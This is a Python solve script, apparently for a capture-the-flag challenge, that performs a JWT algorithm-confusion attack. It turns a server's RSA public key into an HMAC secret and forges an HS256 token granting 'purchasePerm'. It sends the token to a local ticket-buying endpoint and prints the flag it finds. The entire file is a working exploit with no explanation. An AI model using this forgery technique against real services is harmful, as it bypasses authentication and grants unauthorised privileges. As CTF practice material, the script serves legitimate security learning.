import jwt
import requests
import base64
import os

with open(os.path.join(os.path.dirname(__file__), 'public.pem'), 'r') as f:
    public_key = f.read()

filter = (
    public_key
    .replace('-----BEGIN PUBLIC KEY-----', '')
    .replace('-----END PUBLIC KEY-----', '')
    .replace('\n', '')
    .strip()
)

hmac_secret = base64.b64decode(filter)

payload = {"purchasePerm": True}
headers = {"typ": "JWT","alg": "HS256"}

forged_token = jwt.encode(payload, hmac_secret, algorithm='HS256', headers=headers)

if isinstance(forged_token, bytes):
    forged_token = forged_token.decode()

print("Forged Token:", forged_token)

response = requests.get("http://localhost:3000/buyTicket",headers={"Authorization": f"Bearer {forged_token}"})

for line in response.iter_lines(decode_unicode=True):
    if 'ICTF25{' in line:
        print(f'Flag:{line}')
